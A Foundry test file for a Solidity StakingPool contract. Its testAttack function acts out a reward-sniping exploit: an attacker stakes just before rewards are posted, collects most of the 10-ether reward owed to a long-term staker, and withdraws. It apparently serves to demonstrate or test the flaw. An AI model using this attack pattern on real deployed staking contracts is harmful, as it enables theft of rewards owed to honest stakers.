// SPDX-Licence-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/StakingPool.sol";

contract StakingPoolTest is Test {
    StakingPool public pool;

    address public alice = address(0xA11C3);
    address public hacker = address(0x1337);

    function setUp() public {
        pool = new StakingPool();

        vm.deal(alice, 10 ether);
        vm.deal(hacker, 90 ether);
        vm.deal(address(this), 100 ether);
    }

    function testAttack() public {
        vm.prank(alice);
        pool.stake{value: 10 ether}();
        vm.warp(block.timestamp + 7 days);
        vm.prank(hacker);
        pool.stake{value: 90 ether}();
        pool.notifyRewardAmount{value: 10 ether}();
        vm.startPrank(hacker);
        pool.getReward();
        pool.withdraw(90 ether);
        vm.stopPrank();
        assertEq(hacker.balance, 99 ether);
        console.log("Alice rewards earned:", pool.earned(alice));
    }
}
